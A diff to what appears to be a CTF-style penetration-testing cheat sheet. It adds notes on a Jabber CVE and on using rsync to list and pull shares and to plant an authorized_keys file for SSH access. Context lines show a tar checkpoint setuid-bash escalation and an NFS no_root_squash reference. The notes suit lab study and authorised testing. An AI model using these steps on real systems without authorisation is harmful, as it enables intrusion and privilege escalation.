@@ -303,6 +303,11 @@ echo "chmod +s /bin/bash" > exploit.sh
 tar --checkpoint=1 --checkpoint-action=exec=sh exploit.sh >> Like this
 
 
+**JABBER 5222**
+1. Spark(?)
+2. https://github.com/theart42/cves/blob/master/cve-2020-12772/CVE-2020-12772.md
+
+
 
 **NFS2049**
 1. showmount -e <remote-ip>
@@ -337,6 +342,28 @@ example: localhost:/
 
 https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
 You can use that for privilege escalation as shown in this link.
+
+
+
+**RSYNC873**
+Basically rsync allow us to sync remote directory to our local directory so we can access it locally. Same like NFS.
+
+## To Sync file or directory perhaps
+1. rsync -av --list-only rsync://[IP]
+--list-only to list sync file
+-v verbose
+-a archive mode
+
+Archive mode
+preserves time stamps, performs a recursive copy, keeps all file and directory permissions, preserves owner and group information, and copies any symbolic links
+
+2. rsync rsync://[user]@[ip]/[the_sync_file]
+3. mkdir [dir_name]
+4. rsync -av rsync://[user]@[ip]/[the_sync_file] [dir_name_you want to place the sync folder with] 
+
+## To Transfer file
+1. rsync -av [filename] rsync://[user]@[ip]/[the_location_u_want_to_put_it]
+ex: rsync -av authorized_keys rsync://rsync-connect@10.10.119.109/files/sys-internal/.ssh/authorized_keys
 
 
 
